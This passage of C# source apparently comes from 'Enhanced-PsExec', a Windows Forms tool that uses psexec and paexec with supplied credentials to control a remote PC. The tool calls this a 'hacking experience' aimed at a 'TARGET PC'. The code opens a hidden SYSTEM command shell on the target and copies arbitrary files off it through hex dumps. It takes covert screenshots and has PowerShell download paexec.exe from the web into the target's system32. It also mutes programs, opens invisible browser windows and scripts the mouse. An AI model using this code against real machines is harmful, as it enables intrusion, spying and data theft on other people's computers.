            sendKeyboardBox.Text = e.Result.Text;
        }

        private void getFile_Click(object sender, EventArgs e)
        {
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    //Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -i cmd.exe /c tasklist {filterConditions} & echo. & echo Copy your process(es) & pause >nul",
                    //Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s tasklist {filterTextRule}",
                    Arguments = $"/c psexec.exe \\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -nobanner powershell.exe /c Format-Hex \"{getFileLocationBox.Text}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc.Start();

            List<String> raw_lines = new List<string>(proc.StandardOutput.ReadToEnd().Split('\n'));
            List<String> lines = new List<string>();
            List<String> byte_lines = new List<string>();
            proc.Close();
            // get out the bad shit
            int i = 0;
            foreach (string line in raw_lines)
            {
                if (i <= 5 || i >= raw_lines.Count - 3)
                {
                    i++;
                    continue;
                }
                lines.Add(line);
                i++;
            }

            // Get only the bytes themselves
            foreach (string line in lines)
                byte_lines.Add(line.Substring(11, 47).Trim());
            string[] x = byte_lines.ToArray();
            // get the bytes
            List<byte> bytes = new List<byte>();
            foreach (string line in byte_lines)
                foreach (string bt in line.Split(' '))
                    bytes.Add((byte)int.Parse(bt, System.Globalization.NumberStyles.HexNumber));
            ByteArrayToFile(saveToBox.Text + "\\" + getFileLocationBox.Text.Split('\\').Last(), bytes.ToArray());

            var proc1 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c start {saveToBox.Text}\\{getFileLocationBox.Text.Split('\\').Last()}",
                    UseShellExecute = false,
                    RedirectStandardOutput = false,

                    CreateNoWindow = true
                }
            };
            proc1.Start();
            proc1.Close();
        }

        public static bool ByteArrayToFile(string fileName, byte[] byteArray)
        {
            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    fs.Write(byteArray, 0, byteArray.Length);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in process: {0}", ex);
                return false;
            }
        }

        private void chooseSaveBtn_Click(object sender, EventArgs e)
        {
            
            using (FolderBrowserDialog fbd = new FolderBrowserDialog())
            {
                fbd.Description = "Select file location and name";
                
                if (fbd.ShowDialog() == DialogResult.OK)
                    saveToBox.Text = fbd.SelectedPath;

            }
        }

        private void screenshotGoBtn_Click(object sender, EventArgs e)
        {
            screenWidthBox.Value = screenWidthBox.Value < 50 ? 1920 : screenWidthBox.Value;
            screenHeightBox.Value = screenHeightBox.Value < 50 ? 1920 : screenHeightBox.Value;
            var proc2 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "psexec.exe",
                    Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i -accepteula nircmd.exe savescreenshot C:\\captur.png 0 0 {screenWidthBox.Value} {screenHeightBox.Value}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc2.Start();
            proc2.Close();
            
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c psexec.exe \\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -nobanner powershell.exe /c Format-Hex C:\\captur.png",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc.Start();
            var delIt = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c psexec.exe \\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -nobanner cmd.exe /c del C:\\captur.png",
                }
            };
            //delIt.Start();
            List<String> raw_lines = new List<string>(proc.StandardOutput.ReadToEnd().Split('\n'));
            List<String> lines = new List<string>();
            List<String> byte_lines = new List<string>();
            proc.Close();
            Console.WriteLine("\nProcesses stopped\n");
            // get out the bad shit
            int i = 0;
            foreach (string line in raw_lines)
            {
                if (i <= 5 || i >= raw_lines.Count - 3)
                {
                    i++;
                    continue;
                }
                lines.Add(line);
                i++;
            }

            // Get only the bytes themselves
            foreach (string line in lines)
                byte_lines.Add(line.Substring(11, 47).Trim());
            string[] x = byte_lines.ToArray();
            // get the bytes
            List<byte> bytes = new List<byte>();
            foreach (string line in byte_lines)
                foreach (string bt in line.Split(' '))
                    bytes.Add((byte)int.Parse(bt, System.Globalization.NumberStyles.HexNumber));
            
            ByteArrayToFile(saveToBox.Text + "\\capture.png", bytes.ToArray());

            var startPic = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c start {saveToBox.Text}\\capture.png",
                    UseShellExecute = false,
                    RedirectStandardOutput = false,

                    CreateNoWindow = true
                }
            };
            startPic.Start();
            startPic.Close();
        }
        
        private void remoteConsoleBtn_Click(object sender, EventArgs e)
        {
            RemoteConsole remoteConsoleForm = new RemoteConsole(this);
            remoteConsoleForm.Show();
            
            /*
            Process proc = new Process();

            proc.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C echo Connecting To {ipBox.Text} & timeout /t 2 >nul & psexec.exe \\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -nobanner cmd.exe & cmd",
            };
            proc.Start();
            */
        }

        private void parseCommands(string[] gotten)
        {
            int i = 0;
            foreach (string command in gotten)
            {
                if (command.Trim().ToLower().StartsWith("do"))
                {
                    // syntax: do X times{}
                    int times = int.Parse(command.Split(' ')[1]);

                    List<string> loopContent = new List<string>();
                    // get loop content
                    string line = gotten[i+1];
                    int x = 2;
                    while (!line.Contains("}") && line.Trim().Length > 3){
                        loopContent.Add(line.Trim().TrimStart('\t').TrimStart(' '));
                        Console.WriteLine("line: " +line);
                        line = gotten[i + x];
                        x++;
                    }

                    // actually do the things
                    while (times > 0) {
                        parseCommands(loopContent.ToArray());
                        times--;
                    }                      
                }
                else if (command.Trim().ToLower().StartsWith("move"))
                {
                    // Command syntax like this: move x,y
                    try
                    {
                        moveMouseXBox.Text = command.Trim().Substring(4).Replace(" ", "").Split(',')[0].Trim();
                        moveMouseYBox.Text = command.Trim().Substring(4).Replace(" ", "").Split(',')[1].Trim();
                        MoveBtn_Click(new object(), new EventArgs());
                    }
                    catch (IndexOutOfRangeException)
                    {
                        Console.WriteLine("no");
                    }
                }
                else if (command.Trim().ToLower().StartsWith("openurl"))
                {
                    // Syntax: openurl url, tabs, <<incognito>, <newwindow>, <invisible>>
                    try
                    {
                        string url = command.Trim().Substring(7).Replace(" ", "").Split(',')[0];
                        urlBox.Text = url;

                        int tabs = int.Parse(command.Trim().Substring(7).Replace(" ", "").Split(',')[1]);
                        tabsBox.Value = tabs;
                    }
                    catch (Exception) { }
                    incognitoBox.Checked = command.Trim().Substring(7).Replace(" ", "").Contains("incognito,") || command.Substring(7).Replace(" ", "").Contains(",incognito");
                    invisibleBox.Checked = command.Trim().Substring(7).Replace(" ", "").Contains("invisible,") || command.Substring(7).Replace(" ", "").Contains(",invisible");
                    newWindowBox.Checked = command.Trim().Substring(7).Replace(" ", "").Contains("newwindow,") || command.Substring(7).Replace(" ", "").Contains(",newwindow");
                    RunBtn_Click(new object(), new EventArgs());
                }
                else if (command.Trim().ToLower().StartsWith("press"))
                {
                    // Command syntax like this: press [right|left|middle], [down|up|click|doubleclick]
                    string newCommand = command.Trim().Substring(5).Replace(" ", "").ToLower();
                    string button = newCommand.Split(',')[0];
                    string op = newCommand.Split(',')[1];

                    switch (button)
                    {
                        case "right":
                            rightMouseBtn.Checked = true;
                            break;
                        case "left":
                            leftMouseBtn.Checked = true;
                            break;
                        case "middle":
                            middleMouseBtn.Checked = true;
                            break;

                        default:
                            leftMouseBtn.Checked = true;
                            break;
                    }
                    Button b = new Button();

                    switch (op)
                    {
                        case "down":
                            b.Name = "down";
                            break;

                        case "up":
                            b.Name = "up";
                            break;

                        case "click":
                            b.Name = "mouseFullClickBtn";
                            break;

                        case "doubleclick":
                            b.Name = "doubleClickBtn";
                            break;

                        default:
                            b.Name = "mouseFullClickBtn";
                            break;
                    }
                    runMouseClick(b, new EventArgs());
                }
                else if (command.Trim().StartsWith("click"))
                {
                    moveMouseXBox.Text = command.Trim().Substring(5).Replace(" ", "").Split(',')[0].Trim();
                    moveMouseYBox.Text = command.Trim().Substring(5).Replace(" ", "").Split(',')[1].Trim();

                    Button b = new Button();
                    b.Name = "mouseFullClickBtn";

                    MoveBtn_Click(new object(), new EventArgs());
                    runMouseClick(b, new EventArgs());
                }
                else if (command.Trim().ToLower().StartsWith("setvolume"))
                {
                    // Syntax: setvolume vol
                    try
                    {
                        volumeBox.Value = int.Parse(command.Trim().Substring(7).Trim());
                        percentLabel.Text = volumeBox.Value.ToString();
                        SoundRunBtn_Click(new object(), new EventArgs());
                    }
                    catch (IndexOutOfRangeException)
                    {

                    }
                }
                else if (command.Trim().ToLower() == "mute")
                    MuteLabel_Click(new object(), new EventArgs());

                else if (command.Trim().ToLower() == "unmute")
                    UnmuteLabel_Click(new object(), new EventArgs());

                else if (command.Trim().ToLower().StartsWith("delay"))
                {
                    // Command syntax like this: wait MS
                    Thread.Sleep(int.Parse(command.Trim().Substring(5)));
                }
                else if (command.Trim().ToLower().StartsWith("beep"))
                {
                    try
                    {
                        frequencySoundBox.Value = int.Parse(command.Trim().Substring(4).Replace(" ", "").Split(',')[0].Trim());
                        durationSoundBox.Value = int.Parse(command.Trim().Substring(4).Replace(" ", "").Split(',')[1].Trim());
                        RunBeepSoundBtn_Click(new object(), new EventArgs());
                    }
                    catch (Exception) { }
                }

                i++;
            }
        }
        private void runScriptBtn_Click(object sender, EventArgs e)
        {
            parseCommands(scriptBox.Text.Split('\n'));
        }
        private void docsScriptBtn_Click(object sender, EventArgs e)
        {
            if (howto == null)
            {
                howto = new scriptingHowTo(this);
                howto.Show();
            }else
                howto.Focus();

            /*MessageBox.Show("delay <MS> - delay x milliseconds before continuing.\n\n\n" +
                            //"openurl url, tabs, [incognito/newwindow/invisible] - Not Implemented yet.\n\n\n" +

                            "setvolume <Vol> - Percentage of volume to set. A number from 0-100\n\n" +
                            "beep <frequency>, <duration>\n\n" +
                            "mute - Mute the system's sound.\n\n"+
                            "unmute - Unmute the system's sound.\n\n\n"+

                            "move <x>, <y> - Move the computer's mouse position to (x, y)\n\n"+
                            "press <button>, <op> - Button is left/right/middle, op is doubleclick/click/down/up\n\n"+
                            "click <x>, <y> - Left click on (x,y) position of screen. (Moves mouse to x,y then left click)\n\n\n"
                            

                , "How to use", MessageBoxButtons.OK, MessageBoxIcon.Information);
            */
        }

        private void hideInTaskbarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            this.ShowInTaskbar = !hideInTaskbarToolStripMenuItem.Checked;

            List<string> lines = new List<string>();
            lines.Add("; Settings");
            lines.Add(";   Feel free to edit this");
            lines.Add(";   Do not get rid of any setting. set it to true/false");
            lines.Add("");
            lines.Add("ignore_ip_warn                 = " + ignoreIpEmpty.ToString().ToLower());
            lines.Add("ignore_not_connected_warn      = " + ignoreNotConnected.ToString().ToLower());
            lines.Add("always_on_top                  = " + this.TopMost.ToString().ToLower());
            lines.Add("hide_in_taskbar                = " + (!this.ShowInTaskbar).ToString().ToLower());
            lines.Add("dont_use_paexec_on_remote_pc   = " + (noPaExec.ToString().ToLower()));
            
            File.WriteAllLines(configPath, lines.ToArray());
            try
            {
                prefForm.hideInTaskbarBox.Checked = !this.ShowInTaskbar;
            }
            catch (Exception)
            {
                // THIS GETS REMOVED AND EVERYTHING COLLAPSES?
            }
            File.WriteAllLines(configPath, lines.ToArray());
        }

        private void openKeyboardBtn_Click(object sender, EventArgs e)
        {
            keyboardForm = new keyboard(this);
            keyboardForm.Show();
        }

        private void showPassBox_CheckedChanged(object sender, EventArgs e)
        {
            if (showPassBox.Checked)
                passwordBox.PasswordChar = '\0';
            else
                passwordBox.PasswordChar = '*';
        }

        private void processesBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (processesBox.SelectedItems.Count > 0)
            {
                muteProcessBtn.Enabled = true;
                unmuteProcessBtn.Enabled = true;
                volumeProcessBox.Enabled = true;
                processVolumeBtn.Enabled = true;
                killBtn.Enabled = true;
            }
            else
            {
                muteProcessBtn.Enabled = false;
                processVolumeBtn.Enabled = false;
                volumeProcessBox.Enabled = false;
                unmuteProcessBtn.Enabled = false;
                killBtn.Enabled = false;
            }
        }

        private void muteProcessBtn_Click(object sender, EventArgs e)
        {
            List<string> newItems;
            Thread.Sleep((ushort)processDelay.Value);

            var proc2 = new Process();
            foreach (string line in processesBox.SelectedItems)
            {
                newItems = new List<string>();
                foreach (string i in line.Split(' '))
                    if (i != "" && i != null)
                        newItems.Add(i);
                string procname = newItems[0];
                if (injectedCmdProc == null || noPaExec)
                {
                    proc2 = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "psexec.exe",
                            Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i nircmd muteappvolume \"{procname}\" 1 ",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,

                            CreateNoWindow = true
                        }
                    };
                    proc2.Start();
                }
                else
                    injectedCmdProc.StandardInput.WriteLine($"paexec.exe -s -i -d nircmd muteappvolume \"{procname}\" 1");
            }
            proc2.Close();
        }

        private void unmuteProcessBtn_Click(object sender, EventArgs e)
        {
            List<string> newItems;
            Thread.Sleep((ushort)processDelay.Value);

            var proc2 = new Process();
            foreach (string line in processesBox.SelectedItems)
            {
                newItems = new List<string>();
                foreach (string i in line.Split(' '))
                    if (i != "" && i != null)
                        newItems.Add(i);
                string procname = newItems[0];

                if (injectedCmdProc == null || noPaExec)
                {
                    proc2 = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "psexec.exe",
                            Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i nircmd muteappvolume \"{procname}\" 0",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,

                            CreateNoWindow = true
                        }
                    };
                    proc2.Start();
                }
                else
                    injectedCmdProc.StandardInput.WriteLine($"paexec.exe -d -s -i nircmd muteappvolume \"{procname}\" 0");
            }
            proc2.Close();
        }

        private void setProcessVolumeBtn_Click(object sender, EventArgs e)
        {
            List<string> newItems;
            Thread.Sleep((ushort)processDelay.Value);

            var proc2 = new Process();
            foreach (string line in processesBox.SelectedItems)
            {
                newItems = new List<string>();
                foreach (string i in line.Split(' '))
                    if (i != "" && i != null)
                        newItems.Add(i);
                string procname = newItems[0];

                if (injectedCmdProc == null || noPaExec)
                {
                    proc2 = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "psexec.exe",
                            Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -i nircmd setappvolume \"{procname}\" {volumeProcessBox.Value}",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,

                            CreateNoWindow = true
                        }
                    };
                    proc2.Start();
                }
                else
                    injectedCmdProc.StandardInput.WriteLine($"paexec.exe -d -s -i nircmd setappvolume \"{procname}\" {volumeProcessBox.Value}");
            }
            proc2.Close();
        }

        private void main_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.MinimizeBox = (main.SelectedTab != scriptTab);
            if(ipBox.Text.Trim() == "" && !ignoreIpEmpty && main.SelectedTab != homeTab)
            {
                DialogResult result = MessageBox.Show("IP box not filled (Disable this in Preferences).", "oops", MessageBoxButtons.OK, MessageBoxIcon.Error);
                main.SelectedTab = homeTab;
            }
            else if (ipBox.Text.Length > 0 && !ignoreNotConnected && main.SelectedTab == processControlTab && injectedCmdProc == null)
            {
                DialogResult result = MessageBox.Show("You did not connect to the PC.\r\n"+
                    "This is not acceptable for the Process Tab.\r\n\r\n", "Oh No!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                main.SelectedTab = homeTab;
            }
            else if (ipBox.Text.Length > 0 && !ignoreNotConnected && main.SelectedTab != homeTab && injectedCmdProc == null)
            {
                DialogResult result = MessageBox.Show("You did not connect to the PC.\r\nThis will cause severe delays (unless firewall disabled).", "Not Connected Yet", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Warning);
                if (result == DialogResult.Ignore)
                    ignoreNotConnected = true;
                else if (result == DialogResult.Abort)
                    main.SelectedTab = homeTab;
                else if (result == DialogResult.Retry)
                    main_SelectedIndexChanged(sender, e);
            }
        }

        private void epsexecForm_HelpButtonClicked(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (howto == null)
            {
                howto = new scriptingHowTo(this);
                howto.Show();
            }
            else
                howto.Focus();
        }

        private void newToolStripMenuItem_Click(object sender, EventArgs e)
        {
            epsexecForm mf = new epsexecForm();
            mf.Show();
        }

        private void connectBtn_Click(object sender, EventArgs e)
        {
            injectedCmdProc = new Process();

            injectedCmdProc.StartInfo.RedirectStandardError = true;
            injectedCmdProc.StartInfo.RedirectStandardOutput = true;
            injectedCmdProc.StartInfo.RedirectStandardInput = true;

            injectedCmdProc.StartInfo.UseShellExecute = false;
            injectedCmdProc.StartInfo.CreateNoWindow = true;
            injectedCmdProc.StartInfo.FileName = "paexec.exe";
            injectedCmdProc.StartInfo.Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -accepteula -high -s cmd.exe";

            injectedCmdProc.OutputDataReceived += new DataReceivedEventHandler((s, ee) =>
            {
                //AppendTextBox(e.Data + "  \n");
                connectedOutputStr += ee.Data + "\n";
            });
            //injectedCmdProc.ErrorDataReceived += new DataReceivedEventHandler((s, e) =>
            //{
                //AppendTextBox(e.Data + "");
            //});

            injectedCmdProc.Start();
            injectedCmdProc.BeginOutputReadLine();
            injectedCmdProc.BeginErrorReadLine();
            //injectedCmdProc.StandardInput.WriteLine
        }
        private void epsexecForm_ResizeBegin(object sender, EventArgs e)
        {
            incByX = this.Width;
            incByY = this.Height;
        }

        private void epsexecForm_ResizeEnd(object sender, EventArgs e)
        {
            int diffX = this.Width - incByX;
            int diffY = this.Height - incByY;
            if (this.Width - diffX < 1240 || this.Height - diffY < 770) {
                diffX = 0;
                diffY = 0;
                return;
            }
            string getType(object comp)
            {
                try
                {
                    System.Drawing.Point p = ((Button)comp).Location;
                    return "Button";
                }
                catch (Exception)
                {
                    try
                    {
                        System.Drawing.Point p = ((Label)comp).Location;
                        return "Label";
                    }
                    catch (Exception)
                    {
                        try
                        {
                            System.Drawing.Point p = ((NumericUpDown)comp).Location;
                            return "NumericUpDown";
                        }
                        catch (Exception)
                        {
                            try
                            {
                                System.Drawing.Point p = ((CheckBox)comp).Location;
                                return "CheckBox";
                            }
                            catch (Exception)
                            {
                                try
                                {
                                    System.Drawing.Point p = ((TextBox)comp).Location;
                                    return "TextBox";
                                }
                                catch (Exception)
                                {
                                    try
                                    {
                                        System.Drawing.Point p = ((ListBox)comp).Location;
                                        return "ListBox";
                                    }
                                    catch (Exception)
                                    {

                                    }
                                }
                            }
                        }
                    }
                }
                return "";
            }
            
            main.Width += diffX;
            main.Height += diffY;

            List<object> componentsResizeBoth = new List<object>();
            List<object> componentsResizeXonly = new List<object>();
            List<object> componentsResizeYonly = new List<object>();

            List<object> componentsMoveBoth = new List<object>();
            List<object> componentsMoveXonly = new List<object>();
            List<object> componentsMoveYonly = new List<object>();
            // URL control
            componentsMoveBoth.Add(runBtn);

            componentsMoveBoth.Add(label5);
            componentsMoveBoth.Add(label6);
            componentsMoveBoth.Add(delayBeforeBox);
            componentsMoveBoth.Add(delayBetweenBox);
            componentsMoveXonly.Add(label20);
            componentsMoveXonly.Add(terminateChromeBtn);
            componentsMoveXonly.Add(delayTerminate);

            componentsMoveYonly.Add(label1);
            componentsMoveYonly.Add(label2);
            componentsMoveYonly.Add(label3);
            componentsMoveYonly.Add(label4);
            componentsMoveYonly.Add(invisibleLabel);
            componentsMoveYonly.Add(invisibleBox);
            componentsMoveYonly.Add(newWindowBox);
            componentsMoveYonly.Add(incognitoBox);

            componentsResizeXonly.Add(urlBox);

            //------ process control-----------
            componentsResizeBoth.Add(processesBox);

            componentsMoveYonly.Add(clearBtn);
            componentsMoveYonly.Add(killBtn);
            componentsMoveYonly.Add(muteProcessBtn);
            componentsMoveYonly.Add(unmuteProcessBtn);
            componentsMoveYonly.Add(volumeProcessBox);
            componentsMoveYonly.Add(processVolumeBtn);

            componentsMoveXonly.Add(getReloadBtn);
            componentsMoveXonly.Add(autoClearBox);
            componentsMoveXonly.Add(caseInsensitiveBox);
            componentsMoveXonly.Add(excludeBox);
            componentsMoveXonly.Add(label8);
            componentsMoveXonly.Add(filterTextBox);
            //-------------


            List<object> all = new List<object>();
            all.AddRange(componentsMoveBoth);
            all.AddRange(componentsMoveXonly);
            all.AddRange(componentsMoveYonly);

            all.AddRange(componentsResizeBoth);
            all.AddRange(componentsResizeXonly);
            all.AddRange(componentsResizeYonly);

            componentsResizeXonly.AddRange(componentsResizeBoth);
            componentsResizeYonly.AddRange(componentsResizeBoth);
            
            componentsMoveXonly.AddRange(componentsMoveBoth);
            componentsMoveYonly.AddRange(componentsMoveBoth);

            
            foreach (object objComp in all)
            {
                switch (getType(objComp))
                {
                    case "Button":
                        Button compB = (Button)objComp;
                        if (componentsResizeXonly.Contains((object)compB))
                            compB.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compB))
                            compB.Height += diffY;

                        // location
                        if (componentsMoveXonly.Contains((object)compB))
                            compB.Location = new System.Drawing.Point(compB.Location.X + diffX, compB.Location.Y);
                        if (componentsMoveYonly.Contains((object)compB))
                            compB.Location = new System.Drawing.Point(compB.Location.X, compB.Location.Y + diffY);

                        break;
                    case "Label":
                        Label compL = (Label)objComp;
                        if (componentsResizeXonly.Contains((object)compL))
                            compL.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compL))
                            compL.Height += diffY;

                        // location
                        if (componentsMoveXonly.Contains((object)compL))
                            compL.Location = new System.Drawing.Point(compL.Location.X + diffX, compL.Location.Y);
                        if (componentsMoveYonly.Contains((object)compL))
                            compL.Location = new System.Drawing.Point(compL.Location.X, compL.Location.Y + diffY);
                        break;
                    case "NumericUpDown":
                        NumericUpDown compN = (NumericUpDown)objComp;
                        if (componentsResizeXonly.Contains((object)compN))
                            compN.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compN))
                            compN.Height += diffY;

                        // location
                        if (componentsMoveXonly.Contains((object)compN))
                            compN.Location = new System.Drawing.Point(compN.Location.X + diffX, compN.Location.Y);
                        if (componentsMoveYonly.Contains((object)compN))
                            compN.Location = new System.Drawing.Point(compN.Location.X, compN.Location.Y + diffY);
                        break;
                    case "CheckBox":
                        CheckBox compC = (CheckBox)objComp;
                        if (componentsResizeXonly.Contains((object)compC))
                            compC.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compC))
                            compC.Height += diffY;

                        // location
                        if (componentsMoveXonly.Contains((object)compC))
                            compC.Location = new System.Drawing.Point(compC.Location.X + diffX, compC.Location.Y);
                        if (componentsMoveYonly.Contains((object)compC))
                            compC.Location = new System.Drawing.Point(compC.Location.X, compC.Location.Y + diffY);
                        break;
                    case "TextBox":
                        TextBox compT = (TextBox)objComp;
                        if (componentsResizeXonly.Contains((object)compT))
                            compT.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compT))
                            compT.Height += diffY;

                        // location
                        if (componentsMoveXonly.Contains((object)compT))
                            compT.Location = new System.Drawing.Point(compT.Location.X + diffX, compT.Location.Y);
                        if (componentsMoveYonly.Contains((object)compT))
                            compT.Location = new System.Drawing.Point(compT.Location.X, compT.Location.Y + diffY);
                        break;
                    case "ListBox":
                        ListBox compLstbox = (ListBox)objComp;
                        if (componentsResizeXonly.Contains((object)compLstbox))
                            compLstbox.Width += diffX;
                        if (componentsResizeYonly.Contains((object)compLstbox)) { 
                            compLstbox.Height += diffY;
                            compLstbox.Refresh();
                            
                        }

                        // location
                        if (componentsMoveXonly.Contains((object)compLstbox))
                            compLstbox.Location = new System.Drawing.Point(compLstbox.Location.X + diffX, compLstbox.Location.Y);
                        if (componentsMoveYonly.Contains((object)compLstbox))
                            compLstbox.Location = new System.Drawing.Point(compLstbox.Location.X, compLstbox.Location.Y + diffY);
                        break;
                        
                    default:
                        
                        break;
                }
            }

           
        }

        private void paexecAboutLabel_Click(object sender, EventArgs e)
        {
            MessageBox.Show("PaExec is the redistributable version of PsExec (pretty much the same).\r\nAnd required for some of Enhanced-PsExec's functionallity,\r\n and provides a faster hacking experience.\r\n\r\nIt is recommended for it to be installed on the TARGET PC. making it detectable.", "PaExec?", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void downloadPaexecBtn_Click(object sender, EventArgs e)
        {
            string powershellCommand = "wget \"\"\"https://www.poweradmin.com/paexec/paexec.exe\"\"\" -OutFile $env:SystemRoot\\system32\\paexec.exe";

            var proc2 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "psexec.exe",
                    Arguments = $"\\\\{ipBox.Text} -u {usrBox.Text} -p {passwordBox.Text} -s -d -accepteula powershell.exe /c {powershellCommand}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,

                    CreateNoWindow = true
                }
            };
            proc2.Start();
            proc2.Close();
        }

        private void preferencesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /// DO NOT FUCKING CHANGE ANYTHING HERE 
            /// IDK WHY IT FUCKS EVERYTHING UP
            
            try
            {
                prefForm.Show();
            }
            catch (Exception){
                prefForm = new PrefForm(this);
                prefForm.Show();
            }
        }

    }
}
